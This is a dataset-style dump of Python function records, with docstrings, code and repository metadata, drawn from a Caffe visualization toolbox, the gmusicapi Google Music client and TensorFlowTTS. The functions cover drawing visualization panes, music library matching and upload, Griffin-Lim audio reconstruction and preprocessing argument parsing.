{"docstring": "'''Adds text label annotation atop the given pane.'''\n\n", "func_signal": "def _draw_prob_labels_pane(self, pane):\n", "code": "if not self.labels or not self.state.show_label_predictions or not self.settings.caffevis_prob_layer:\n    return\n\n#pane.data[:] = to_255(self.settings.window_background)\ndefaults = {'face':  getattr(cv2, self.settings.caffevis_class_face),\n            'fsize': self.settings.caffevis_class_fsize,\n            'clr':   to_255(self.settings.caffevis_class_clr_0),\n            'thick': self.settings.caffevis_class_thick}\nloc = self.settings.caffevis_class_loc[::-1]   # Reverse to OpenCV c,r order\nclr_0 = to_255(self.settings.caffevis_class_clr_0)\nclr_1 = to_255(self.settings.caffevis_class_clr_1)\n\nprobs_flat = self.net.blobs[self.settings.caffevis_prob_layer].data.flatten()\ntop_5 = probs_flat.argsort()[-1:-6:-1]\n\nstrings = []\npmax = probs_flat[top_5[0]]\nfor idx in top_5:\n    prob = probs_flat[idx]\n    text = '%.2f %s' % (prob, self.labels[idx])\n    fs = FormattedString(text, defaults)\n    #fs.clr = tuple([clr_1[ii]*prob/pmax + clr_0[ii]*(1-prob/pmax) for ii in range(3)])\n    fs.clr = tuple([max(0,min(255,clr_1[ii]*prob + clr_0[ii]*(1-prob))) for ii in range(3)])\n    strings.append([fs])   # Line contains just fs\n\ncv2_typeset_text(pane.data, strings, loc,\n                 line_spacing = self.settings.caffevis_class_line_spacing)", "path": "deep-visualization-toolbox/caffevis/app.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Returns the data shown in highres format, b01c order.'''\n\n", "func_signal": "def _draw_layer_pane(self, pane):\n", "code": "if self.state.layers_show_back:\n    layer_dat_3D = self.net.blobs[self.state.layer].diff[0]\nelse:\n    layer_dat_3D = self.net.blobs[self.state.layer].data[0]\n# Promote FC layers with shape (n) to have shape (n,1,1)\nif len(layer_dat_3D.shape) == 1:\n    layer_dat_3D = layer_dat_3D[:,np.newaxis,np.newaxis]\n\nn_tiles = layer_dat_3D.shape[0]\ntile_rows,tile_cols = self.net_layer_info[self.state.layer]['tiles_rc']\n\ndisplay_3D_highres = None\nif self.state.pattern_mode:\n    # Show desired patterns loaded from disk\n\n    load_layer = self.state.layer\n    if self.settings.caffevis_jpgvis_remap and self.state.layer in self.settings.caffevis_jpgvis_remap:\n        load_layer = self.settings.caffevis_jpgvis_remap[self.state.layer]\n\n    \n    if self.settings.caffevis_jpgvis_layers and load_layer in self.settings.caffevis_jpgvis_layers:\n        jpg_path = os.path.join(self.settings.caffevis_unit_jpg_dir,\n                                'regularized_opt', load_layer, 'whole_layer.jpg')\n\n        # Get highres version\n        #cache_before = str(self.img_cache)\n        display_3D_highres = self.img_cache.get((jpg_path, 'whole'), None)\n        #else:\n        #    display_3D_highres = None\n\n        if display_3D_highres is None:\n            try:\n                with WithTimer('CaffeVisApp:load_sprite_image', quiet = self.debug_level < 1):\n                    display_3D_highres = load_square_sprite_image(jpg_path, n_sprites = n_tiles)\n            except IOError:\n                # File does not exist, so just display disabled.\n                pass\n            else:\n                self.img_cache.set((jpg_path, 'whole'), display_3D_highres)\n        #cache_after = str(self.img_cache)\n        #print 'Cache was / is:\\n  %s\\n  %s' % (cache_before, cache_after)\n\n    if display_3D_highres is not None:\n        # Get lowres version, maybe. Assume we want at least one pixel for selection border.\n        row_downsamp_factor = int(np.ceil(float(display_3D_highres.shape[1]) / (pane.data.shape[0] / tile_rows - 2)))\n        col_downsamp_factor = int(np.ceil(float(display_3D_highres.shape[2]) / (pane.data.shape[1] / tile_cols - 2)))\n        ds = max(row_downsamp_factor, col_downsamp_factor)\n        if ds > 1:\n            #print 'Downsampling by', ds\n            display_3D = display_3D_highres[:,::ds,::ds,:]\n        else:\n            display_3D = display_3D_highres\n    else:\n        display_3D = layer_dat_3D * 0  # nothing to show\n\nelse:\n\n    # Show data from network (activations or diffs)\n    if self.state.layers_show_back:\n        back_what_to_disp = self.get_back_what_to_disp()\n        if back_what_to_disp == 'disabled':\n            layer_dat_3D_normalized = np.tile(self.settings.window_background, layer_dat_3D.shape + (1,))\n        elif back_what_to_disp == 'stale':\n            layer_dat_3D_normalized = np.tile(self.settings.stale_background, layer_dat_3D.shape + (1,))\n        else:\n            layer_dat_3D_normalized = tile_images_normalize(layer_dat_3D,\n                                                            boost_indiv = self.state.layer_boost_indiv,\n                                                            boost_gamma = self.state.layer_boost_gamma,\n                                                            neg_pos_colors = ((1,0,0), (0,1,0)))\n    else:\n        layer_dat_3D_normalized = tile_images_normalize(layer_dat_3D,\n                                                        boost_indiv = self.state.layer_boost_indiv,\n                                                        boost_gamma = self.state.layer_boost_gamma)\n    #print ' ===layer_dat_3D_normalized.shape', layer_dat_3D_normalized.shape, 'layer_dat_3D_normalized dtype', layer_dat_3D_normalized.dtype, 'range', layer_dat_3D_normalized.min(), layer_dat_3D_normalized.max()\n\n    display_3D         = layer_dat_3D_normalized\n\n# Convert to float if necessary:\ndisplay_3D = ensure_float01(display_3D)\n# Upsample gray -> color if necessary\n#   e.g. (1000,32,32) -> (1000,32,32,3)\nif len(display_3D.shape) == 3:\n    display_3D = display_3D[:,:,:,np.newaxis]\nif display_3D.shape[3] == 1:\n    display_3D = np.tile(display_3D, (1, 1, 1, 3))\n# Upsample unit length tiles to give a more sane tile / highlight ratio\n#   e.g. (1000,1,1,3) -> (1000,3,3,3)\nif display_3D.shape[1] == 1:\n    display_3D = np.tile(display_3D, (1, 3, 3, 1))\nif self.state.layers_show_back and not self.state.pattern_mode:\n    padval = self.settings.caffevis_layer_clr_back_background\nelse:\n    padval = self.settings.window_background\n\nhighlights = [None] * n_tiles\nwith self.state.lock:\n    if self.state.cursor_area == 'bottom':\n        highlights[self.state.selected_unit] = self.settings.caffevis_layer_clr_cursor  # in [0,1] range\n    if self.state.backprop_selection_frozen and self.state.layer == self.state.backprop_layer:\n        highlights[self.state.backprop_unit] = self.settings.caffevis_layer_clr_back_sel  # in [0,1] range\n\n_, display_2D = tile_images_make_tiles(display_3D, hw = (tile_rows,tile_cols), padval = padval, highlights = highlights)\n\nif display_3D_highres is None:\n    display_3D_highres = display_3D\n\n# Display pane based on layers_pane_zoom_mode\nstate_layers_pane_zoom_mode = self.state.layers_pane_zoom_mode\nassert state_layers_pane_zoom_mode in (0,1,2)\nif state_layers_pane_zoom_mode == 0:\n    # Mode 0: normal display (activations or patterns)\n    display_2D_resize = ensure_uint255_and_resize_to_fit(display_2D, pane.data.shape)\nelif state_layers_pane_zoom_mode == 1:\n    # Mode 1: zoomed selection\n    unit_data = display_3D_highres[self.state.selected_unit]\n    display_2D_resize = ensure_uint255_and_resize_to_fit(unit_data, pane.data.shape)\nelse:\n    # Mode 2: zoomed backprop pane\n    display_2D_resize = ensure_uint255_and_resize_to_fit(display_2D, pane.data.shape) * 0\n\npane.data[:] = to_255(self.settings.window_background)\npane.data[0:display_2D_resize.shape[0], 0:display_2D_resize.shape[1], :] = display_2D_resize\n\nif self.settings.caffevis_label_layers and self.state.layer in self.settings.caffevis_label_layers and self.labels and self.state.cursor_area == 'bottom':\n    # Display label annotation atop layers pane (e.g. for fc8/prob)\n    defaults = {'face':  getattr(cv2, self.settings.caffevis_label_face),\n                'fsize': self.settings.caffevis_label_fsize,\n                'clr':   to_255(self.settings.caffevis_label_clr),\n                'thick': self.settings.caffevis_label_thick}\n    loc_base = self.settings.caffevis_label_loc[::-1]   # Reverse to OpenCV c,r order\n    lines = [FormattedString(self.labels[self.state.selected_unit], defaults)]\n    cv2_typeset_text(pane.data, lines, loc_base)\n    \nreturn display_3D_highres", "path": "deep-visualization-toolbox/caffevis/app.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "\"\"\"Use validictory and a static schema (stored in cls._res_schema).\"\"\"\n", "func_signal": "def validate(cls, response, msg):\n", "code": "try:\n    return validictory.validate(msg, cls._res_schema)\nexcept ValueError as e:\n    raise ValidationException(str(e)) from e", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Returns a string built from the current log lines.\"\"\"\n\n", "func_signal": "def build_log(self):\n", "code": "encoded_lines = [line.encode('utf-8') for line in self.log_lines]\nreturn \"\\n\".join(encoded_lines)", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"\n:param song_ids: a list of song ids.\n:param playlist_id: playlist id to delete from, or 'all' for deleting from library.\n:param entry_ids: when deleting from playlists, corresponding list of entry ids.\n\"\"\"\n\n", "func_signal": "def dynamic_data(song_ids, playlist_id='all', entry_ids=None):\n", "code": "if entry_ids is None:\n    # this is strange, but apparently correct\n    entry_ids = [''] * len(song_ids)\n\nreturn {\n    'json': json.dumps(\n        {\"songIds\": song_ids, \"entryIds\": entry_ids, \"listId\": playlist_id}\n    )\n}", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "# Comparator - defines how to compare query and song data.\n# f(song data, query) -> truthy value\n", "func_signal": "def __init__(self, q_t, s_t, comp):\n", "code": "self.comp = comp\n\n# Query and song transformers -\n# manipulate query, song before comparison.\n# f(unicode) -> unicode\nself.q_t = q_t\n\nself.s_t = s_t", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Returns a list of queries from the given file.\nQueries have the form [(<query>, <metadata type>), ...]\n\n:param f: opened file, ready to read.\n:param regex: a compiled regex to capture query info from file lines.\n:param cap_types: the GM metadata types of the regex captures.\n:param cap_pr: the priority of the captures.\n:param encoding: (optional) encoding of the file.\n\"\"\"\n\n", "func_signal": "def build_queries_from(f, regex, cap_types, cap_pr, encoding='ascii'):\n", "code": "queries = []\n\nfor line in f:\n        matches = regex.match(line)\n\n        if matches:\n            # Zip captures to their types and order by priority to build a query.\n            query = reorder_to(\n                list(zip(matches.groups(), cap_types)),\n                cap_pr)\n\n            queries.append(query)\n\nreturn queries", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Queries the library for songs.\nreturns a list of matches, or None.\n\"\"\"\n\n", "func_signal": "def query_library(self, query, tie_breaker=no_tiebreak, modifiers=None, auto=False):\n", "code": "if not modifiers:\n    modifiers = []\n\ntry:\n    if not auto:\n        return self.query_library_rec(query, self.library,\n                                      self.QueryState(query, tie_breaker, modifiers, auto))\n    else:\n        # Auto mode attempts a search with the current modifiers.\n        # If we get 1 result, we return it.\n        # If we get no results, we add the next mod from auto_modifers and try again.\n        # If we get many results, we branch and try with another modifier.\n        # On no results, we tiebreak our old results.\n        # Otherwise, we return the branched results.\n\n        current_mods = modifiers[:]\n        # Be ready to use any mods from the auto list which we aren't using already.\n        future_mods = (m for m in self.auto_modifiers if m not in modifiers)\n\n        while True:  # broken when future_mods runs out\n\n            # will not break ties in auto mode\n            results = self.query_library_rec(\n                query, self.library,\n                self.QueryState(query, tie_breaker, current_mods, auto))\n\n            if not results:\n                try:\n                    current_mods.append(next(future_mods))\n                except StopIteration:\n                    return results\n\n            elif len(results) == 1:\n                return results\n\n            else:\n                # Received many results from our current search.\n                # Branch; try more modifers to try and improve.\n                # If results, use them; otherwise tiebreak ours.\n                try:\n                    current_mods.append(next(future_mods))\n                except StopIteration:\n                    raise self.TieBroken(tie_breaker.__func__(query, results))\n\n                next_results = self.query_library(query, tie_breaker, current_mods, auto)\n\n                if not next_results:\n                    raise self.TieBroken(tie_breaker.__func__(query, results))\n                else:\n                    return next_results\nexcept self.TieBroken as tie:\n    return tie.results", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"\n:param playlist_id: id of the playlist to add to.\n:param song_ids: a list of song ids\n\"\"\"\n# TODO unsure what type means here. Likely involves uploaded vs store/free.\n", "func_signal": "def dynamic_data(playlist_id, song_ids):\n", "code": "song_refs = [{'id': sid, 'type': 1} for sid in song_ids]\n\nreturn {\n    'json': json.dumps(\n        {\"playlistId\": playlist_id, \"songRefs\": song_refs}\n    )\n}", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Finds the changes between two playlists.\n\nReturns a tuple of (deletions, additions, staying).\nDeletions and additions are both Counters of (sid, eid) tuples;\nstaying is a set of (sid, eid) tuples.\n\n:param old: the original playlist.\n:param modified: the modified playlist.\"\"\"\n\n", "func_signal": "def find_playlist_changes(orig_tracks, modified_tracks):\n", "code": "s_pairs = get_id_pairs(orig_tracks)\n\n# Three cases for desired pairs:\n# 1: (sid, eid from this playlist): either no action or add\n#    (if someone adds a dupe from the same playlist)\n# 2: (sid, eid not from this playlist): add\n# 3: (sid, None): add\nd_pairs = get_id_pairs(modified_tracks)\n\n# Counters are multisets.\ns_count = Counter(s_pairs)\nd_count = Counter(d_pairs)\n\nto_del = s_count - d_count\nto_add = d_count - s_count\nto_keep = set(s_count & d_count)  # guaranteed to be counts of 1\n\nreturn (to_del, to_add, to_keep)", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Prompts a user to choose a result from multiple.\nFor use with query_library as a tiebreaker.\nReturns a singleton list or None.\n\n:param query: the original query.\n:param results: list of results.\n\"\"\"\n\n", "func_signal": "def manual_tiebreak(query, results):\n", "code": "print()\nprint(\"Manual tiebreak for query:\")\nprint(build_query_rep(query).encode('utf-8'))\nprint()\nprint(\"Enter the number next to your choice:\")\nprint()\nprint(\"0: None of these.\")\n\nmenu_lines = []\nkey = 1\n\nfor song in results:\n    menu_lines.append(\n        str(key) +\n        \": \" +\n        build_song_rep(song).encode('utf-8'))\n\n    key += 1\n\nprint(\"\\n\".join(menu_lines))\n\nchoice = -1\n\nwhile not (0 <= choice <= len(results)):\n    try:\n        choice = int(input(\"Choice: \"))\n    except ValueError:\n        pass\n\nreturn None if choice == 0 else [results[choice - 1]]", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\" Demonstrate some api features. \"\"\"\n\n", "func_signal": "def demonstrate():\n", "code": "api = authenticate()\n\n# Demonstrate upload feature.\n# Create a list of one or more file paths of the mp3s you would like \n# to upload\nfilepaths = []\nfilepaths.append('./song1.mp3')\n\n# Upload an mp3 to your library. upload() returns a tuple of information\n# about the success or failure of uploads\nprint(\"Beginning upload...\\n\")\nuploaded = api.upload(filepaths) \n\n# Print all successfully uploaded songs\nif len(uploaded[0]) > 0:\n    print(\"Successfully uploaded:\")\n    i = 1\n    for key in uploaded[0]:\n        print(\"%d. %s\" % (i, key))\n        i += 1\n\n# Print all unsuccessfully uploaded songs and a description of why\n# songs weren't uploaded\nif len(uploaded[2]) == 0:\n    print(\"\\nAll songs successfully uploaded.\")\nelse:\n    print(\"Not all songs were successfully uploaded:\")\n    i = 1\n    for key in uploaded[2]:\n        print(\"%d. %s not uploaded: %s\" % (i, key, uploaded[2][key]))\n        i += 1\n\n\n# Demonstrate download feature\n# Get information about songs previously uploaded that are available\n# to be downloaded\nuploaded_songs = api.get_uploaded_songs()\n\nif len(uploaded_songs) == 0:\n    print(\"There are no songs currently available for download\")\nelse:\n    # Print songs that are available for download and store their ids\n    # so we can download them\n    song_ids = []\n    print(\"\\nThe following songs are available for download\")\n    for i in range(len(uploaded_songs)):\n        song_ids.append(uploaded_songs[i]['id'])\n        print(\"%d. %s\" % (i+1, uploaded_songs[i]['title']))\n\n    # Download uploaded songs from your library\n    print(\"\\nBeginning download...\")\n    for i in range(len(song_ids)):\n        filename, audio = api.download_song(song_ids[i])\n\n        # Write song to disk\n        with open(filename, 'wb') as f:\n            f.write(audio)\n\n        print(\"%d. Written to ./%s\" % (i + 1, filename))\n    print(\"\\nDownload complete.\")\n\n# It's good practice to logout when finished\napi.logout()", "path": "gmusicapi/musicmanager_example.py", "commit_date": "2020-06-02 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Returns a list of desired metadata from a song.\nDoes not modify the given song.\n\n:param song: Dictionary representing a GM song.\n:param md_list: (optional) the ordered list of metadata to select.\n:param no_singletons: (optional) if md_list is of length 1, return the data,\n  not a singleton list.\n\"\"\"\n\n", "func_signal": "def filter_song_md(song, md_list=['id'], no_singletons=True):\n", "code": "filtered = [song[md_type] for md_type in md_list]\n\nif len(md_list) == 1 and no_singletons:\n    return filtered[0]\nelse:\n    return filtered", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Returns a list of matches, or None.\nRecursive querying routine for query_library.\n\"\"\"\n\n", "func_signal": "def query_library_rec(self, query, library, state):\n", "code": "if len(query) == 0:\n    return None\n\n# Composing applies right to left; currently mods are left to right.\n# Reverse then append the default modifier for proper compose order.\nmods_to_apply = [sm for sm in reversed(state.mods)]\nmods_to_apply.append(self.SearchModifier(\n    lambda q: q,\n    lambda sd: sd,\n    operator.eq))\n\n# Create the transformers by composing all of them.\nq_t = compose(*list(map((lambda sm: sm.q_t), mods_to_apply)))\ns_t = compose(*list(map((lambda sm: sm.s_t), mods_to_apply)))\n\n# Use the most outward comparator.\ncomp = mods_to_apply[0].comp\n\nq, md_type = query[0]\n\n# No need to repeatedly transform q.\nq_transformed = q_t(q)\n\n# GM limits libraries to 20k songs; this isn't a big performance hit.\nresults = [s for s in library if comp(s_t(s[md_type]), q_transformed)]\n\n# Check for immediate return conditions.\nif not results:\n    return None\n\nif len(results) == 1:\n    return [results[0]]\n\n# Try to refine results by querying them with the next metadata in the query.\nnext_query = query[1:]\n\nnext_results = self.query_library_rec(next_query, results, state)\n\nif not next_results:\n    # Don't break ties in auto mode; it's handled a level up.\n    if not state.auto:\n        raise self.TieBroken(state.t_breaker(state.orig, results))\n    else:\n        return results\n\n# Now we have multiple for both our query and the next.\n# Always prefer the next query to ours.\nreturn next_results", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"\n:param songs: a list of dicts ``{'id': '...', 'albumArtUrl': '...'}``\n\"\"\"\n", "func_signal": "def dynamic_data(songs, session_id=\"\"):\n", "code": "supported = {'id', 'albumArtUrl', 'title', 'artist', 'albumArtist', 'album'}\nfor s in songs:\n    for k in s.keys():\n        if k not in supported:\n            raise ValueError(\"ChangeSongMetadata only supports the the following keys: \"\n                             + str(supported) +\n                             \". All other keys must be removed. Key encountered:\" + k)\n\n# jsarray is just wonderful\njsarray = [[session_id, 1]]\nsong_arrays = [[s['id'],\n                s.get('title'),\n                s.get('albumArtUrl'),\n                s.get('artist'),\n                s.get('album'),\n                s.get('albumArtist')]\n               + [None] * 33 + [[]] for s in songs]\njsarray.append([song_arrays])\n\nreturn json.dumps(jsarray)", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Runs queries against the library; returns a list of songs.\nMatch success is logged.\n\n:param query: list of (query, metadata type) in order of precedence.\n              eg [('The Car Song', 'title'), ('The Cat Empire', 'artist')]\n:param tie_breaker: (optional) tie breaker to use.\n:param modifiers: (optional) An ordered collection of SearchModifers.\n  Applied during the query left to right.\n:param auto: (optional) When True, automagically manage modifiers to find results.\n\"\"\"\n\n", "func_signal": "def match(self, queries, tie_breaker=manual_tiebreak, auto=True):\n", "code": "matches = []\n\nself.log_lines.append(\"## Starting match of \" + str(len(queries)) + \" queries ##\")\n\nfor query in queries:\n    res = self.query_library(query, tie_breaker, auto=auto)\n\n    if res:\n        matches += res\n\n    # Log the results.\n\n    # The alert precedes the information for a quick view of what happened.\n    alert = None\n    if res is None:\n        alert = \"!!\"\n    elif len(res) == 1:\n        alert = \"==\"\n    else:\n        alert = \"??\"\n\n    # Each query shows the alert and the query.\n    self.log_lines.append(alert + \" \" + build_query_rep(query))\n\n    # Displayed on the line below the alert (might be useful later).\n    extra_info = None\n\n    if res:\n        for song in res:\n            self.log_lines.append(\n                (extra_info if extra_info else (' ' * len(alert))) +\n                \" \" +\n                self.build_song_for_log(song))\n\n    elif extra_info:\n        self.log_lines.append(extra_info)\n\nreturn matches", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Prepares songs for matching and determines logging options.\n\n:param songs: list of GM songs to match against.\n:param log_metadata: list of valid GM metadata types to show in the log.\n                     order given will be order outputted.\n\"\"\"\n\n# If match times are a problem, could\n# read to an indexed format here.\n", "func_signal": "def __init__(self, songs, log_metadata=['title', 'artist', 'album']):\n", "code": "self.library = songs\n\n# Lines of a log of how matching went.\nself.log_lines = []\n\nself.log_metadata = log_metadata", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"\n:param image_filepath: path to an image\n\"\"\"\n", "func_signal": "def dynamic_files(image_filepath):\n", "code": "with open(image_filepath, 'rb') as f:\n    contents = f.read()\n\nreturn {'albumArt': (image_filepath, contents)}", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"\n:param playlist_id: id of the playlist to delete.\n\"\"\"\n", "func_signal": "def dynamic_data(playlist_id):\n", "code": "return {\n    'json': json.dumps(\n        {\"id\": playlist_id}\n    )\n}", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Returns a string of the requested metadata types.\nThe order of md_list determines order in the string.\n\n:param song: Dictionary representing a GM song.\n:param md_list: (optional) list of valid GM metadata types.\n:param divider: (optional) string to join the metadata.\n\"\"\"\n\n", "func_signal": "def build_song_rep(song, md_list=['title', 'artist', 'album'], divider=\" - \"):\n", "code": "filtered = filter_song_md(song, md_list, no_singletons=False)\n\nreturn divider.join(filtered)", "path": "gmusicapi/gmusicapi/gmtools/tools.py", "commit_date": "2020-01-10 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Make an instance of the api and attempts to authenticate the user.\nReturn the authenticated api.\n\"\"\"\n\n# We are uploading and then downloading so we want Musicmanager\n", "func_signal": "def authenticate():\n", "code": "api = Musicmanager()\n\n# Attempt to authenticate and log in\nlogged_in = api.login()\n\n# If login() returns false, you have not performed oauth yet, or did not\n# write your credentials to your disk. Using oauth allows authentication\n# without providing plaintext credentials to the application\nif not logged_in:\n    print('No oauth credentials found, please authenticate your account')\n\n    # Performs oauth and stores generated credentials to Appdirs \n    # 'user_data_dir' by default. oauth only needs to be performed once per \n    # machine if the credentials are stored, which is the default behavior.\n    authenticated = api.perform_oauth(open_browser=True)\nelse:\n    print('Successfully logged in.\\n')\n\nreturn api", "path": "gmusicapi/musicmanager_example.py", "commit_date": "2020-06-02 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "# Failed responses always have a success=False key.\n# Some successful responses do not have a success=True key, however.\n# TODO remove utils.call_succeeded\n\n", "func_signal": "def check_success(cls, response, msg):\n", "code": "if 'success' in msg and not msg['success']:\n    raise CallFailure(\n        \"the server reported failure. This is usually\"\n        \" caused by bad arguments, but can also happen if requests\"\n        \" are made too quickly (eg creating a playlist then\"\n        \" modifying it before the server has created it)\",\n        cls.__name__)", "path": "gmusicapi/gmusicapi/protocol/webclient.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "simon-weber/gmusicapi", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 4143}
{"docstring": "\"\"\"Apply GL algorithm to batched mel spectrograms.\nArgs:\n    mel_spec (tf.Tensor): normalized mel spectrogram.\n    n_iter (int): number of iterations to run GL algorithm.\nReturns:\n    (tf.Tensor): reconstructed signal from GL algorithm.\n\"\"\"\n# de-normalize mel spectogram\n", "func_signal": "def call(self, mel_spec, n_iter=32):\n", "code": "if self.normalized:\n    mel_spec = tf.math.pow(\n        10.0, mel_spec * self.scaler.scale_ + self.scaler.mean_\n    )\nelse:\n    mel_spec = tf.math.pow(\n        10.0, mel_spec\n    )  # TODO @dathudeptrai check if its ok without it wavs were too quiet\ninverse_mel = tf.linalg.pinv(self.mel_basis)\n\n# [:, num_mels] @ [fft_size // 2 + 1, num_mels].T\nmel_to_linear = tf.linalg.matmul(mel_spec, inverse_mel, transpose_b=True)\nmel_to_linear = tf.cast(tf.math.maximum(1e-10, mel_to_linear), tf.complex64)\n\ninit_phase = tf.cast(\n    tf.random.uniform(tf.shape(mel_to_linear), maxval=1), tf.complex64\n)\nphase = tf.math.exp(2j * np.pi * init_phase)\nfor _ in tf.range(n_iter):\n    inverse = tf.signal.inverse_stft(\n        mel_to_linear * phase,\n        frame_length=self.ds_config[\"win_length\"] or self.ds_config[\"fft_size\"],\n        frame_step=self.ds_config[\"hop_size\"],\n        fft_length=self.ds_config[\"fft_size\"],\n        window_fn=tf.signal.inverse_stft_window_fn(self.ds_config[\"hop_size\"]),\n    )\n    phase = tf.signal.stft(\n        inverse,\n        self.ds_config[\"win_length\"] or self.ds_config[\"fft_size\"],\n        self.ds_config[\"hop_size\"],\n        self.ds_config[\"fft_size\"],\n    )\n    phase /= tf.cast(tf.maximum(1e-10, tf.abs(phase)), tf.complex64)\n\nreturn tf.signal.inverse_stft(\n    mel_to_linear * phase,\n    frame_length=self.ds_config[\"win_length\"] or self.ds_config[\"fft_size\"],\n    frame_step=self.ds_config[\"hop_size\"],\n    fft_length=self.ds_config[\"fft_size\"],\n    window_fn=tf.signal.inverse_stft_window_fn(self.ds_config[\"hop_size\"]),\n)", "path": "TensorFlowTTS/tensorflow_tts/utils/griffin_lim.py", "commit_date": "2020-08-08 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Parse arguments and set configuration parameters.\"\"\"\n", "func_signal": "def parse_and_config():\n", "code": "parser = argparse.ArgumentParser(\n    description=\"Preprocess audio and text features \"\n    \"(See detail in tensorflow_tts/bin/preprocess_dataset.py).\"\n)\nparser.add_argument(\n    \"--rootdir\",\n    default=None,\n    type=str,\n    required=True,\n    help=\"Directory containing the dataset files.\",\n)\nparser.add_argument(\n    \"--outdir\",\n    default=None,\n    type=str,\n    required=True,\n    help=\"Output directory where features will be saved.\",\n)\nparser.add_argument(\n    \"--dataset\",\n    type=str,\n    default=\"ljspeech\",\n    choices=[\"ljspeech\", \"kss\", \"libritts\", \"baker\", \"thorsten\"],\n    help=\"Dataset to preprocess.\",\n)\nparser.add_argument(\n    \"--config\", type=str, required=True, help=\"YAML format configuration file.\"\n)\nparser.add_argument(\n    \"--n_cpus\",\n    type=int,\n    default=4,\n    required=False,\n    help=\"Number of CPUs to use in parallel.\",\n)\nparser.add_argument(\n    \"--test_size\",\n    type=float,\n    default=0.05,\n    required=False,\n    help=\"Proportion of files to use as test dataset.\",\n)\nparser.add_argument(\n    \"--verbose\",\n    type=int,\n    default=0,\n    choices=[0, 1, 2],\n    help=\"Logging level. 0: DEBUG, 1: INFO and WARNING, 2: INFO, WARNING, and ERROR\",\n)\nargs = parser.parse_args()\n\n# set logger\nFORMAT = \"%(asctime)s (%(module)s:%(lineno)d) %(levelname)s: %(message)s\"\nlog_level = {0: logging.DEBUG, 1: logging.WARNING, 2: logging.ERROR}\nlogging.basicConfig(level=log_level[args.verbose], format=FORMAT)\n\n# load config\nconfig = yaml.load(open(args.config), Loader=yaml.Loader)\nconfig.update(vars(args))\n# config checks\nassert config[\"format\"] == \"npy\", \"'npy' is the only supported format.\"\nreturn config", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", 